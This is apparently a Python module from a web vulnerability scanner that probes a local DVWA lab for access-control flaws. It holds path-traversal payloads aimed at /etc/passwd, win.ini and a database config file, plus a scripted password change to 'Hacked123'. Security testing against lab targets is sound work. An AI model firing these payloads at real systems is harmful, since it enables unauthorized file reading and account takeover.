"""
IDOR (Insecure Direct Object References) Testing Module for DV-WebScanPro
Tests for unauthorized access to other users' data
"""

from urllib.parse import quote
from utils.helpers import print_info, print_vuln, print_success, print_error
from utils.http_client import HttpClient
from bs4 import BeautifulSoup

class IDORTester:
    """IDOR vulnerability tester"""
    
    def __init__(self):
        self.http = HttpClient()
        self.vulnerabilities = []
        
    def login_first(self):
        """Login to DVWA"""
        print_info("Logging into DVWA...")
        return self.http.login_dvwa()
    
    def test_sqli_idor(self):
        """Test IDOR in SQL injection page (user IDs)"""
        print_info("\n" + "="*60)
        print_info("TESTING IDOR IN USER PROFILES")
        print_info("="*60)
        
        sqli_url = "http://localhost/DVWA/vulnerabilities/sqli/"
        
        # Try to access different user IDs
        test_ids = [1, 2, 3, 4, 5]
        
        for user_id in test_ids:
            test_url = f"{sqli_url}?id={user_id}&Submit=Submit"
            print_info(f"Trying to access user ID: {user_id}")
            
            response = self.http.get(test_url)
            if not response:
                continue
            
            # Check if we can see user data
            if "First name:" in response.text and "Surname:" in response.text:
                print_vuln(f"  ✓ Can access user {user_id} data")
                
                # Extract username
                soup = BeautifulSoup(response.text, 'html.parser')
                pre_tags = soup.find_all('pre')
                for pre in pre_tags:
                    if user_id == 1 and "admin" in pre.text.lower():
                        print_info(f"    Found admin user data")
                
                # For ID 1 is our own, others are IDOR if accessible without auth
                if user_id > 1:
                    vuln = {
                        'type': 'IDOR',
                        'url': sqli_url,
                        'parameter': 'id',
                        'description': f'Can access user {user_id} data',
                        'risk': 'High',
                        'remediation': 'Implement proper access controls, use session-based authentication'
                    }
                    self.vulnerabilities.append(vuln)
    
    def test_file_inclusion(self):
        """Test IDOR in file inclusion pages"""
        print_info("\n" + "="*60)
        print_info("TESTING IDOR IN FILE INCLUSION")
        print_info("="*60)
        
        fi_url = "http://localhost/DVWA/vulnerabilities/fi/"
        
        # Test files that shouldn't be accessible
        test_files = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "file1.php",
            "file2.php",
            "file3.php",
            "../../../config/config.inc.php",
        ]
        
        for test_file in test_files:
            test_url = f"{fi_url}?page={quote(test_file)}"
            print_info(f"Trying to access: {test_file}")
            
            response = self.http.get(test_url)
            if not response:
                continue
            
            # Check for signs of successful file inclusion
            if "root:" in response.text or "mysql" in response.text.lower() or "[extensions]" in response.text:
                print_vuln(f"  ✓ FILE INCLUSION POSSIBLE - Can access {test_file}")
                
                vuln = {
                    'type': 'File Inclusion (IDOR)',
                    'url': fi_url,
                    'parameter': 'page',
                    'payload': test_file,
                    'risk': 'High',
                    'remediation': 'Validate file paths, use whitelist of allowed files'
                }
                self.vulnerabilities.append(vuln)
                break
    
    def test_password_change_idor(self):
        """Test IDOR in password change functionality"""
        print_info("\n" + "="*60)
        print_info("TESTING IDOR IN PASSWORD CHANGE")
        print_info("="*60)
        
        csrf_url = "http://localhost/DVWA/vulnerabilities/csrf/"
        
        # Try to change password (this is CSRF but also tests if we can change without proper token)
        response = self.http.get(csrf_url)
        if not response:
            return
        
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'user_token'})
        token_value = token.get('value', '') if token else ''
        
        # Try to change password
        test_url = f"{csrf_url}?password_new=Hacked123&password_conf=Hacked123&Change=Change&user_token={token_value}"
        
        response = self.http.get(test_url)
        
        if response and "Password Changed" in response.text:
            print_vuln("  ✓ Can change password - CSRF/IDOR vulnerability")
            
            vuln = {
                'type': 'CSRF/IDOR - Password Change',
                'url': csrf_url,
                'risk': 'High',
                'remediation': 'Implement CSRF tokens and confirm current password'
            }
            self.vulnerabilities.append(vuln)
    
    def run_tests(self):
        """Run all IDOR tests"""
        if self.login_first():
            self.test_sqli_idor()
            self.test_file_inclusion()
            self.test_password_change_idor()
            
            print_info("\n" + "="*60)
            print_info("IDOR TEST RESULTS SUMMARY")
            print_info("="*60)
            
            if self.vulnerabilities:
                print_vuln(f"Found {len(self.vulnerabilities)} IDOR vulnerabilities!")
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    print_info(f"{i}. {vuln['type']} - Risk: {vuln['risk']}")
            else:
                print_info("No IDOR vulnerabilities found")
            
            return self.vulnerabilities
        else:
            print_error("Login failed")
            return []